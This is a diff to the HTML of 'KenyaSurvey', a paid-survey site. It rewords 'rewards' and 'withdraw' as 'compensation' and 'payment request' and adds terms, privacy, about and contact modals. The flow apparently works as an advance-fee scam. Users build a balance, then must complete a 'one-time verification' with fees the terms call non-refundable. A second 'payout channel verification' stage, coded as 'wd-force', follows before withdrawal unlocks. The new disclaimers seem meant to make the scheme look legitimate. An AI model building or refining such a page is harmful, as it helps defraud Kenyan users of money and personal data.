@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>KenyaSurvey - Research Surveys & Rewards</title>
+<title>KenyaSurvey – Research Participation Platform</title>
 <link rel="preconnect" href="https://fonts.googleapis.com" />
 <link rel="stylesheet" href="app.css">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -16,7 +16,7 @@
 <div class="toast-container" id="toast-container"></div>
 <div class="earn-pop" id="earn-pop">
   <div class="earn-amount" id="earn-amount">+KSh 0</div>
-  <div class="earn-label">Rewarded!</div>
+  <div class="earn-label">Compensation Added!</div>
 </div>
 
 <!-- ════════════════ AUTH SCREEN ════════════════ -->
@@ -25,7 +25,21 @@
     <div class="logo-wrap">
       <div class="logo-icon"><i class="fas fa-graduation-cap"></i></div>
       <div class="logo-title">Kenya<span>Survey</span></div>
-      <div class="logo-sub">Share your opinions through research surveys</div>
+      <div class="logo-sub">Research Participation Platform</div>
+    </div>
+
+    <!-- HOW IT WORKS SECTION -->
+    <div class="how-it-works">
+      <div class="hiw-title"><i class="fas fa-info-circle"></i> How It Works</div>
+      <ol class="hiw-steps">
+        <li>Create a participant account</li>
+        <li>Complete your demographic profile</li>
+        <li>Participate in available research surveys</li>
+        <li>Compensation is calculated per eligible response</li>
+        <li>Complete account verification requirements</li>
+        <li>Submit payment requests to M-Pesa</li>
+      </ol>
+      <p class="hiw-note">Survey eligibility varies by project. Not all participants qualify for every survey opportunity. Compensation amounts vary depending on project requirements and completion status.</p>
     </div>
 
     <div class="auth-tabs">
@@ -36,8 +50,8 @@
     <!-- REGISTER FORM -->
     <div class="auth-form" id="form-register">
       <div class="bonus-badge">
-        <i class="fas fa-gift"></i>
-        Complete your profile to access available survey opportunities
+        <i class="fas fa-clipboard-list"></i>
+        Complete your profile to access available research survey opportunities
       </div>
       <div class="field-group">
         <label class="field-label">Phone Number</label>
@@ -64,7 +78,7 @@
       <button class="btn-primary" id="btn-register" onclick="doRegister()">
         <i class="fas fa-user-plus"></i> Create Account
       </button>
-      <p class="auth-note">By registering, you agree to participate in surveys and receive rewards according to platform terms.</p>
+      <p class="auth-note">By registering, you agree to our <a href="#" onclick="showModal('terms')">Terms of Service</a> and <a href="#" onclick="showModal('privacy')">Privacy Policy</a>. Participation in surveys does not guarantee compensation.</p>
     </div>
 
     <!-- LOGIN FORM -->
@@ -88,6 +102,17 @@
         <i class="fas fa-sign-in-alt"></i> Sign In
       </button>
     </div>
+
+    <!-- AUTH FOOTER LINKS -->
+    <div class="auth-footer-links">
+      <a href="#" onclick="showModal('about')">About Us</a>
+      <span>·</span>
+      <a href="#" onclick="showModal('terms')">Terms of Service</a>
+      <span>·</span>
+      <a href="#" onclick="showModal('privacy')">Privacy Policy</a>
+      <span>·</span>
+      <a href="#" onclick="showModal('contact')">Contact</a>
+    </div>
   </div>
 </div>
 
@@ -97,7 +122,7 @@
     <div class="profile-header">
       <div class="logo-icon" style="margin:0 auto 16px"><i class="fas fa-user-check"></i></div>
       <h2>Complete Your Profile</h2>
-      <p>Fill in your details to personalize your survey experience and access available survey opportunities.</p>
+      <p>Your demographic information helps match you to relevant research surveys. All data is handled in accordance with our Privacy Policy.</p>
     </div>
 
     <div class="auth-form">
@@ -183,9 +208,9 @@
     </div>
 
     <div class="balance-card">
-      <div class="balance-label">Available Rewards</div>
+      <div class="balance-label">Available Compensation</div>
       <div class="balance-amount" id="sidebar-balance">KSh 0.00</div>
-      <div class="balance-earned" id="sidebar-earned">Total rewards: KSh 0.00</div>
+      <div class="balance-earned" id="sidebar-earned">Total compensation: KSh 0.00</div>
     </div>
 
     <ul class="nav-list">
@@ -202,7 +227,7 @@
       </li>
       <li class="nav-item">
         <button class="nav-link" id="nav-withdraw" onclick="showPanel('withdraw')">
-          <i class="fas fa-wallet"></i> Withdraw
+          <i class="fas fa-wallet"></i> Payment Request
         </button>
       </li>
       <li class="nav-item">
@@ -213,6 +238,12 @@
     </ul>
 
     <div class="sidebar-footer">
+      <div class="sidebar-legal">
+        <a href="#" onclick="showModal('about')">About</a>
+        <a href="#" onclick="showModal('terms')">Terms</a>
+        <a href="#" onclick="showModal('privacy')">Privacy</a>
+        <a href="#" onclick="showModal('contact')">Contact</a>
+      </div>
       <div class="user-info">
         <div class="user-avatar"><i class="fas fa-user"></i></div>
         <div>
@@ -232,14 +263,14 @@
     <!-- ── DASHBOARD PANEL ── -->
     <div class="page-panel active" id="panel-dashboard">
       <div class="page-title" id="dash-greeting">Good day!</div>
-      <div class="page-sub">Track your rewards and survey activity.</div>
+      <div class="page-sub">Track your compensation and research participation activity.</div>
 
       <div class="start-survey-hero">
         <div class="start-survey-left">
           <div class="start-survey-icon-wrap"><i class="fas fa-clipboard-list"></i></div>
           <div>
             <div class="start-survey-heading">Ready to Participate?</div>
-            <div class="start-survey-desc">Participate in survey activities and receive rewards based on eligible responses.</div>
+            <div class="start-survey-desc">Participate in research surveys and receive compensation based on eligible responses. Eligibility varies by project.</div>
           </div>
         </div>
         <button class="btn-start-survey" onclick="showPanel('survey')">
@@ -247,12 +278,12 @@
         </button>
       </div>
 
-       <div class="activation-banner" id="activation-banner">
+      <div class="activation-banner" id="activation-banner">
         <div class="activation-text">
-          <h3 id="activation-banner-title"><i class="fas fa-user-check" style="margin-right:6px"></i>Complete Account Verification</h3>
-          <p id="activation-banner-desc">To verify account ownership and maintain platform security, a one-time verification process is required before your first reward redemption.</p>
+          <h3 id="activation-banner-title"><i class="fas fa-shield-alt" style="margin-right:6px"></i>Account Verification Required</h3>
+          <p id="activation-banner-desc">To verify your registered mobile number and activate payment services, a one-time account verification process is required before your first payment request.</p>
         </div>
-        <button class="btn-activate" id="activation-banner-btn" onclick="showPanel('withdraw')">Complete Verification</button>
+        <button class="btn-activate" id="activation-banner-btn" onclick="showPanel('withdraw')">Verify Account</button>
       </div>
 
       <div class="stats-grid">
@@ -260,21 +291,21 @@
           <div class="stat-icon green"><i class="fas fa-coins"></i></div>
           <div>
             <div class="stat-value" id="stat-balance">0.00</div>
-            <div class="stat-label">Balance (KSh)</div>
+            <div class="stat-label">Compensation (KSh)</div>
           </div>
         </div>
         <div class="stat-card">
           <div class="stat-icon gold"><i class="fas fa-trophy"></i></div>
           <div>
             <div class="stat-value" id="stat-earned">0.00</div>
-            <div class="stat-label">Total Rewards (KSh)</div>
+            <div class="stat-label">Total Compensation (KSh)</div>
           </div>
         </div>
         <div class="stat-card">
           <div class="stat-icon blue"><i class="fas fa-check-circle"></i></div>
           <div>
             <div class="stat-value" id="stat-completed">0</div>
-            <div class="stat-label">Completed Activities</div>
+            <div class="stat-label">Surveys Completed</div>
           </div>
         </div>
         <div class="stat-card">
@@ -288,7 +319,7 @@
 
       <div class="progress-card">
         <div class="progress-header">
-          <span class="progress-title"><i class="fas fa-chart-line" style="color:var(--green);margin-right:6px"></i>Survey Progress</span>
+          <span class="progress-title"><i class="fas fa-chart-line" style="color:var(--green);margin-right:6px"></i>Participation Progress</span>
           <span class="progress-count" id="progress-text">0 / 120 completed</span>
         </div>
         <div class="progress-bar">
@@ -296,11 +327,17 @@
         </div>
       </div>
 
+      <!-- COMPENSATION DISCLOSURE -->
+      <div class="disclosure-card">
+        <i class="fas fa-info-circle"></i>
+        <p>Compensation is subject to survey eligibility and project availability. KenyaSurvey does not guarantee a specific income level. Payment processing is subject to verification requirements.</p>
+      </div>
+
       <div class="section-title"><i class="fas fa-receipt"></i> Recent Transactions</div>
       <div class="tx-list" id="dash-tx-list">
         <div class="empty-state">
           <i class="fas fa-inbox"></i>
-          <p>No activity recorded yet. Participate in surveys to begin earning rewards.</p>
+          <p>No activity recorded yet. Participate in surveys to begin earning compensation.</p>
         </div>
       </div>
     </div>
@@ -309,8 +346,8 @@
     <div class="page-panel" id="panel-survey">
       <div class="survey-top">
         <div>
-          <div class="page-title">Survey Questions</div>
-          <div class="page-sub">Participate in surveys and receive rewards based on eligible responses.</div>
+          <div class="page-title">Research Surveys</div>
+          <div class="page-sub">Answer research questions and receive compensation for eligible responses.</div>
         </div>
         <div id="page-dots" class="page-indicator"></div>
       </div>
@@ -330,24 +367,24 @@
       </div>
     </div>
 
-    <!-- ── WITHDRAW PANEL ── -->
-   <div class="page-panel withdraw-box" id="panel-withdraw">
-      <div class="page-title">Reward Redemption</div>
-      <div class="page-sub">Redeem eligible rewards directly to your M-Pesa account.</div>
- 
+    <!-- ── PAYMENT REQUEST PANEL ── -->
+    <div class="page-panel withdraw-box" id="panel-withdraw">
+      <div class="page-title">Payment Request</div>
+      <div class="page-sub">Request payment of your accumulated compensation to M-Pesa.</div>
+
       <div class="info-card">
         <div class="info-row">
-          <span class="label">Current Rewards</span>
+          <span class="label">Available Compensation</span>
           <span class="value green" id="wd-balance">KSh 0.00</span>
         </div>
         <div class="info-row">
-          <span class="label">Minimum Withdrawal</span>
+          <span class="label">Minimum Payment Request</span>
           <span class="value">KSh 150</span>
         </div>
         <div class="info-row">
           <span class="label">Account Status</span>
           <span class="value" id="wd-status">
-            <span class="chip gold"><i class="fas fa-user-check"></i> Verification Required</span>
+            <span class="chip gold"><i class="fas fa-shield-alt"></i> Verification Required</span>
           </span>
         </div>
         <div class="info-row" id="wd-phone-row" style="display:none">
@@ -355,12 +392,15 @@
           <span class="value" id="wd-reg-phone" style="color:var(--text2);font-size:0.85rem"></span>
         </div>
       </div>
- 
-      <!-- Stage 1: Not activated -->
+
+      <!-- Stage 1: Account Verification -->
       <div id="wd-locked" class="hidden">
         <div class="locked-msg">
           <i class="fas fa-shield-alt"></i>
-          <p>To verify account ownership and maintain platform security, a one-time account verification process is required before your first reward redemption.</p>
+          <div>
+            <strong style="color:var(--gold);display:block;margin-bottom:6px;">Account Verification</strong>
+            <p>To verify ownership of your registered mobile number and activate M-Pesa payment services, a one-time verification process is required. This confirms your identity before your first payment request is processed.</p>
+          </div>
         </div>
         <div class="field-group" style="margin-bottom:16px">
           <label class="field-label">M-Pesa Phone Number</label>
@@ -372,28 +412,35 @@
         <div class="alert error" id="act-error"></div>
         <div class="alert success" id="act-success"></div>
         <button class="btn-activate" style="width:100%;padding:14px;font-size:0.95rem;" id="btn-activate" onclick="doActivate()">
-          <i class="fas fa-user-check"></i> Complete Verification
+          <i class="fas fa-shield-alt"></i> Verify Account
         </button>
-        <p class="auth-note" style="margin-top:12px">One-time verification process.</p>
+        <p class="auth-note" style="margin-top:12px">One-time verification required to activate payment services. This process confirms your registered mobile number.</p>
       </div>
- 
-      <!-- Stage 2 -->
+
+      <!-- Stage 2: Payout Channel Verification -->
       <div id="wd-force" class="hidden">
         <div style="background:rgba(0,166,81,0.08);border:1px solid rgba(0,166,81,0.25);border-radius:var(--radius);padding:16px;margin-bottom:20px;display:flex;align-items:flex-start;gap:12px;">
           <i class="fas fa-check-circle" style="color:var(--green);margin-top:2px"></i>
           <div>
-            <div style="font-size:0.88rem;font-weight:700;color:var(--green-light);margin-bottom:3px;">Account Verified</div>
-            <div style="font-size:0.82rem;color:var(--text2);line-height:1.5;">Your verification has been completed successfully. You can now proceed with reward redemption according to platform requirements.</div>
+            <div style="font-size:0.88rem;font-weight:700;color:var(--green-light);margin-bottom:3px;">Identity Verified</div>
+            <div style="font-size:0.82rem;color:var(--text2);line-height:1.5;">Your account identity has been verified. To complete the M-Pesa payout channel setup and enable payment processing, a payout channel verification step is required.</div>
+          </div>
+        </div>
+        <div class="locked-msg" style="margin-bottom:16px;">
+          <i class="fas fa-info-circle" style="color:#3b82f6"></i>
+          <div>
+            <strong style="color:#60a5fa;display:block;margin-bottom:4px;">Payout Channel Verification</strong>
+            <p>This step registers your M-Pesa number as a verified payout channel. This is required to ensure successful delivery of compensation to your mobile wallet.</p>
           </div>
         </div>
         <div class="alert error" id="fv-error"></div>
         <div class="alert success" id="fv-success"></div>
         <button class="btn-activate" style="width:100%;padding:14px;font-size:0.95rem;background:linear-gradient(135deg,#3b82f6,#1d4ed8);" id="btn-force-verify" onclick="doForceVerify()">
-          <i class="fas fa-paper-plane" style="margin-right:8px"></i> Continue to Withdrawal
+          <i class="fas fa-link" style="margin-right:8px"></i> Verify Payout Channel
         </button>
       </div>
- 
-      <!-- Stage 3 -->
+
+      <!-- Stage 3: Unlocked -->
       <div id="wd-unlocked" class="hidden">
         <div class="field-group" style="margin-bottom:16px">
           <label class="field-label">M-Pesa Phone Number</label>
@@ -403,7 +450,7 @@
           </div>
         </div>
         <div class="field-group" style="margin-bottom:8px">
-          <label class="field-label">Amount to Withdraw (KSh)</label>
+          <label class="field-label">Amount to Request (KSh)</label>
           <div class="amount-display" id="wd-amount-display">150</div>
           <input type="range" class="slider-input" id="wd-slider" min="150" max="1000" step="10" value="150" oninput="updateSlider()" />
           <div style="display:flex;justify-content:space-between;font-size:0.75rem;color:var(--text3);margin-top:4px">
@@ -413,24 +460,114 @@
         <div class="alert error" id="wd-error"></div>
         <div class="alert success" id="wd-success"></div>
         <button class="btn-primary" id="btn-withdraw" onclick="doWithdraw()" style="margin-top:12px">
-          <i class="fas fa-paper-plane"></i> Request Withdrawal
+          <i class="fas fa-paper-plane"></i> Submit Payment Request
         </button>
+        <p class="auth-note" style="margin-top:10px">Payment requests are processed to your registered M-Pesa number. Processing may take up to 24 hours.</p>
       </div>
     </div>
 
     <!-- ── TRANSACTIONS PANEL ── -->
     <div class="page-panel" id="panel-transactions">
-      <div class="page-title">Transaction History</div>
-      <div class="page-sub">View your reward activity and redemption history.</div>
+      <div class="page-title">Compensation History</div>
+      <div class="page-sub">View your compensation activity and payment request history.</div>
       <div class="tx-list" id="all-tx-list">
         <div class="empty-state">
           <i class="fas fa-inbox"></i>
-          <p>No activity recorded yet. Participate in surveys to begin earning rewards.</p>
+          <p>No activity recorded yet. Participate in surveys to begin earning compensation.</p>
         </div>
       </div>
     </div>
 
   </main>
+</div>
+
+<!-- ════════════════ MODALS ════════════════ -->
+<div class="modal-overlay" id="modal-overlay" onclick="closeModal()"></div>
+
+<!-- About Modal -->
+<div class="modal" id="modal-about">
+  <div class="modal-header">
+    <h3><i class="fas fa-info-circle"></i> About KenyaSurvey</h3>
+    <button onclick="closeModal()"><i class="fas fa-times"></i></button>
+  </div>
+  <div class="modal-body">
+    <p>KenyaSurvey is a research participation platform that connects eligible participants with survey and data collection projects across Kenya.</p>
+    <p>We help organizations and researchers gather opinions, demographic data, and survey responses from verified Kenyan participants. Participants who complete eligible surveys may receive compensation via M-Pesa.</p>
+    <h4>Our Mission</h4>
+    <p>To make research participation accessible to all Kenyans while providing fair compensation for participants' time and input.</p>
+    <h4>Compensation Disclaimer</h4>
+    <p>Compensation is not guaranteed. Eligibility depends on project availability, participant demographics, survey completion, and compliance with platform requirements. KenyaSurvey does not promise a specific income level.</p>
+    <div class="modal-contact-info">
+      <p><i class="fas fa-envelope"></i> support@kenyasurvey.com</p>
+      <p><i class="fas fa-globe"></i> premium-surveys-kenya.vercel.app</p>
+    </div>
+  </div>
+</div>
+
+<!-- Terms Modal -->
+<div class="modal" id="modal-terms">
+  <div class="modal-header">
+    <h3><i class="fas fa-file-contract"></i> Terms of Service</h3>
+    <button onclick="closeModal()"><i class="fas fa-times"></i></button>
+  </div>
+  <div class="modal-body">
+    <h4>1. Eligibility</h4>
+    <p>You must be 18 years or older and a resident of Kenya to participate. Account registration requires a valid Kenyan mobile number.</p>
+    <h4>2. Survey Participation</h4>
+    <p>Survey availability and eligibility are determined by individual project requirements. Not all registered participants will qualify for all surveys. Compensation is only awarded for surveys you are eligible for and complete according to project requirements.</p>
+    <h4>3. Compensation</h4>
+    <p>Compensation amounts are set per survey project. KenyaSurvey does not guarantee any specific income. Compensation is paid via M-Pesa to your registered number after verification requirements are met.</p>
+    <h4>4. Account Verification</h4>
+    <p>Before payment services are activated, participants must complete an account verification process. This confirms your registered mobile number and activates the M-Pesa payout channel. Verification fees are non-refundable.</p>
+    <h4>5. Prohibited Conduct</h4>
+    <p>Creating multiple accounts, submitting false information, or attempting to manipulate survey responses may result in account suspension and forfeiture of compensation.</p>
+    <h4>6. Termination</h4>
+    <p>KenyaSurvey reserves the right to suspend or terminate accounts that violate these terms.</p>
+  </div>
+</div>
+
+<!-- Privacy Modal -->
+<div class="modal" id="modal-privacy">
+  <div class="modal-header">
+    <h3><i class="fas fa-user-shield"></i> Privacy Policy</h3>
+    <button onclick="closeModal()"><i class="fas fa-times"></i></button>
+  </div>
+  <div class="modal-body">
+    <h4>Information We Collect</h4>
+    <p>We collect your phone number, PIN (hashed), demographic information (name, county, occupation, education), and survey responses.</p>
+    <h4>How We Use Your Information</h4>
+    <p>Your information is used to match you to relevant surveys, process compensation payments, and maintain platform security. Demographic data may be shared in aggregate, anonymised form with research clients.</p>
+    <h4>M-Pesa Payments</h4>
+    <p>Your phone number is used to process M-Pesa payments. We do not store your M-Pesa PIN. Payment processing is handled by Safaricom's M-Pesa API.</p>
+    <h4>Data Security</h4>
+    <p>All passwords and PINs are hashed. Connections are encrypted via HTTPS. We do not sell your personal data to third parties.</p>
+    <h4>Your Rights</h4>
+    <p>You may request deletion of your account and personal data by contacting support@kenyasurvey.com.</p>
+  </div>
+</div>
+
+<!-- Contact Modal -->
+<div class="modal" id="modal-contact">
+  <div class="modal-header">
+    <h3><i class="fas fa-envelope"></i> Contact Us</h3>
+    <button onclick="closeModal()"><i class="fas fa-times"></i></button>
+  </div>
+  <div class="modal-body">
+    <p>For support, questions, or concerns about your account, please reach out to us.</p>
+    <div class="modal-contact-info">
+      <p><i class="fas fa-envelope"></i> <strong>Email:</strong> support@kenyasurvey.com</p>
+      <p><i class="fas fa-clock"></i> <strong>Response Time:</strong> Within 24–48 hours</p>
+    </div>
+    <div class="contact-topics">
+      <p><strong>Common topics:</strong></p>
+      <ul>
+        <li>Account verification issues</li>
+        <li>Payment request status</li>
+        <li>Survey eligibility questions</li>
+        <li>Account deletion requests</li>
+      </ul>
+    </div>
+  </div>
 </div>
 
 <script src="app.js"></script>
